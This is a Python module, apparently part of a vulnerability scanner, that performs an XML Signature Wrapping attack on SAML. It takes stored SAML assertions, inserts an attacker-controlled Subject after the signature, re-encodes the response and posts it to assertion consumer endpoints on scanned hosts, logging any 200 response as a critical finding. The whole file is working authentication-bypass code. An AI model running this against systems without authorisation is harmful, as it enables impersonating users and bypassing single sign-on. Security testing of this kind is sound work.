"""XML Signature Wrapping attack for SAML assertions."""

from __future__ import annotations

import base64
import logging
import re
from typing import Any
from urllib.parse import urlparse

from src.analysis.active.auth.credential_vault import CredentialVault
from src.analysis.passive.runtime import ResponseCache
from src.analysis._core.http_request import _safe_request

logger = logging.getLogger(__name__)

SIGNATURE_PATTERN = re.compile(r"<Signature[^>]*>.*?</Signature>", re.IGNORECASE | re.DOTALL)
ATTACKER_SUBJECT_ID = "urn:example:attacker:subject"


def _extract_saml_response_body(text: str) -> str | None:
    match = re.search(r"SAMLResponse=([^&\s]+)", text, re.IGNORECASE)
    if not match:
        return None
    try:
        return base64.b64decode(match.group(1)).decode("utf-8", errors="replace")
    except Exception:  # noqa: S110
        return None


def _wrap_once(xml_text: str, attacker_subject: str) -> str | None:
    if SIGNATURE_PATTERN.search(xml_text) is None:
        return None
    return SIGNATURE_PATTERN.sub(
        lambda match: f"{match.group(0)}\n<Subject>{attacker_subject}</Subject>",
        xml_text,
        count=1,
    )


def _saml_response_value(xml_text: str) -> str:
    return base64.b64encode(xml_text.encode("utf-8")).decode("ascii")


def _submit_saml_response(url: str, saml_response_value: str, vault: CredentialVault) -> dict[str, Any] | None:
    body = (
        "SAMLResponse="
        + saml_response_value
        + "&RelayState=&SigAlg=http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
    )
    response = _safe_request(url, method="POST", body=body.encode("utf-8"), timeout=12)
    if response:
        vault.inject_into_request(response, url)
    return response


def _endpoint_key(url: str) -> str:
    try:
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.hostname}{parsed.path or '/'}"
    except Exception:  # noqa: S110
        return url


def _build_replay_targets(source_url: str, scan_hosts: set[str]) -> list[str]:
    target_netlocs = {_safe_netloc(source_url)} if _safe_netloc(source_url) else set()
    target_netlocs.update(_clean_netloc(host) for host in scan_hosts if _is_web_target(host))
    if not target_netlocs:
        return [source_url]
    return [f"https://{netloc}/saml/acs" for netloc in target_netlocs]


def _safe_netloc(url: str) -> str:
    try:
        return urlparse(url).hostname or ""
    except Exception:  # noqa: S110
        return ""


def _clean_netloc(host: str) -> str:
    return (host or "").split(":", 1)[0].strip().lower()


def _is_web_target(host: str) -> bool:
    if not host:
        return False
    return "." in host and not host.endswith((".local", ".lan", ".internal"))


def run_xsw_attack(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    credential_vault: CredentialVault | None = None,
    *,
    limit: int = 12,
) -> list[dict[str, Any]]:
    vault = credential_vault or CredentialVault()
    findings: list[dict[str, Any]] = []
    seen_endpoints: set[str] = set()
    saml_assertions = vault.saml_assertions()
    for assertion in saml_assertions:
        if len(findings) >= limit:
            break
        credential_id = assertion.get("credential_id")
        credential = vault.get_credential_for_url(assertion.get("scope_url") or "")
        assertion_value = credential.value if credential else assertion.get("assertion_value")
        if not assertion_value:
            continue
        source_url = assertion.get("scope_url", "")
        endpoint_key = _endpoint_key(source_url)
        if endpoint_key in seen_endpoints:
            continue
        seen_endpoints.add(endpoint_key)
        wrapped_xml = _wrap_once(assertion_value, ATTACKER_SUBJECT_ID)
        if not wrapped_xml:
            continue
        saml_response_value = _saml_response_value(wrapped_xml)
        for endpoint in _build_replay_targets(source_url, vault.scan_host_netlocs):
            if len(findings) >= limit:
                break
            response = _submit_saml_response(endpoint, saml_response_value, vault)
            if not response or int(response.get("status", 0)) != 200:
                continue
            findings.append(
                {
                    "url": endpoint,
                    "endpoint_key": endpoint_key,
                    "attack": "xsw_signature_wrap",
                    "original_credential_id": credential_id,
                    "attacker_subject": ATTACKER_SUBJECT_ID,
                    "response_status": 200,
                    "confidence": 0.92,
                    "severity": "critical",
                }
            )
    findings.sort(key=lambda item: (-item.get("confidence", 0.0), item.get("url", "")))
    return findings[:limit]
